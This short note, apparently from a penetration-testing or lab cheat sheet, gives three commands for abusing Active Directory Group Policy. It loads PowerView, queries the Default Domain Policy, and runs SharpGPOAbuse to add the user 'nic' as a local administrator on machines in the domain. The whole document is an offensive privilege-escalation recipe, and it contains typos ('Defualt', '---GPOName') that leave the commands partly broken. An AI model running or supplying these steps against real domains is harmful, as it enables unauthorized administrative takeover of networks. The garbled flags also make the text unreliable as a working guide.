First, start powerview
```
./PowerView.ps1
```
Check for Default Domain Policy
```
Get-GPO -Name "Defualt Domain Policy"
```
Using SharpGPOAbuse:
```
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount nic ---GPOName "Default Domain Policy"
```